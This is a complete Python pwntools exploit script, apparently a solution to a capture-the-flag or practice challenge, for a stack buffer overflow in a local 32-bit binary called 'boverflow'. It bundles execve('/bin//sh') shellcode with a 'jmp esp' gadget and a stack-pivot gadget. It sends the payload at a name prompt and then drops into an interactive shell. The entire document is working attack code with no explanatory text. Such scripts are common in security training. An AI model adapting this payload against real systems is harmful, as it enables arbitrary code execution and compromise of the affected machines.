from pwn import * 

context(terminal=['tmux','new-window'])
p = process("./boverflow")
#p = gdb.debug("./boverflow","b *0x0804857a")
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
shellcode += "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

jmp_esp = 0x08048504 # : jmp esp;
pivoting = 0x080484fd #: push ebp ; mov ebp, esp ; sub esp, 0x24 ; ret



payload = ''
payload += p32(jmp_esp) 
payload += shellcode
payload += 'a' * (32-len(shellcode))  
payload += p32(pivoting) 


p.recvuntil("What\'s your name?")
p.sendline(payload)
p.recv()

p.interactive()
